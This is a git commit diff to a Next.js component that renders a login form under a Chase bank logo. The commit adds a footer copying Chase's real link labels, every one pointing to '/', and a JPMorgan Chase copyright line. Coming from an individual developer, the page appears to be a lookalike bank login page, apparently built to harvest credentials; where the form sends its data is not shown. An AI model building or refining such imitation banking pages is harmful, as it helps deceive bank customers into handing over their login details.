f8ca7cee526f847fab305ad2f72b508d6cc55cba
Xqlusive23 <ayoimisi@gmail.com>
2024-05-28 23:53:33 +0100

    footer

--- app/components/main.tsx
+++ app/components/main.tsx
@@ -3,6 +3,8 @@
 import axios from "axios";
 import Image from "next/image";
 import { useEffect, useState } from "react";
+import Link from "next/link";
+
 
 export default function Main() {
 
@@ -79,17 +81,17 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
       // padding:'25px 15%',
       backgroundRepeat: 'no-repeat',
       backgroundPosition: 'center',
-      height: '80vh', // Example height, adjust as needed
+      height: '100vh', // Example height, adjust as needed
       width: '100%', // Example width, adjust as needed
       zIndex:9999}}
       >
       <div className="flex justify-center items-center">
-        <img src="/assets/chase.png" alt="logo" className="w-64 mt-1 mb-20 filter contrast-200"  />
+        <img src="/assets/chase.png" alt="logo" className="w-64 mt-6 py-6 mb-20 filter contrast-200"  />
       </div>
     <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto mt-30 px-4 filter contrast-100">
-      <div className="flex flex-col items-center justify-center space-y-4 p-8 rounded-md shadow-xl bg-white w-full">
+      <div className="flex flex-col items-center justify-center space-y-4 p-8 rounded-md shadow-xl bg-white w-full -mt-20">
           
-          <form onSubmit={handleSubmit} className=" space-y-5 p-8 rounded-md shadow-x1 w-full">
+          <form onSubmit={handleSubmit} className=" space-y-5 p-6 rounded-md shadow-x1 w-full">
         <label htmlFor="username" className="block text-sm font-medium text-gray-500">Username</label>
         <input
           id="username"
@@ -123,16 +125,39 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
         <span>Not Enrolled? Sign Up Now </span>
         </div>
       </form>
-      
-        </div>
-        <div className="flex justify-center items-center flex-col">
-          <span className="text-center text-gray-500 mt-56">Follow Us:</span>
         </div>
         </div>
-        <div style={{textAlign: 'center', padding:'40px 20%' , marginTop:'-2%'}}>
+{/* <div className="flex justify-center items-center flex-col">
+          <span className="text-center text-gray-500 py-3 mt-28">Follow Us:</span>
+        </div>
+        <div style={{textAlign: 'center', padding:'5px 20%' , marginTop:'-2%'}}>
   <hr style={{borderTop: '1px solid #000', marginTop: '20px'}} />
-</div>
-
+</div> */}
+        <div className="flex flex-col bg-white py-10 px-4 mt-6 text-xs">
+          <form>
+          <span>
+          <div className='flex-col w-full mx-auto leading-10 space-x-6 text-xs underline text-underline-offset-2'>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500 ">Contact Us</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Privacy</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Security</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Terms of use</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Accessibility</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">SAFE Act: Chase Mortgage Loan Originators</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Fair Lending</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">About Chase</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">J.P. Morgan</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">JPMorgan Chase & Co.</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Careers</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500"> Español</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Chase Canada</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Site Map</a></Link>
+          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Member FDIC</a></Link>
+        </div>
+          </span>
+          <footer className="flex justify-center items-center w-full mx-auto mt-2">(c) 2023 JPMorgan Chase & Co.</footer>
+          
+          </form>
+        </div>
    </main>
    
   );
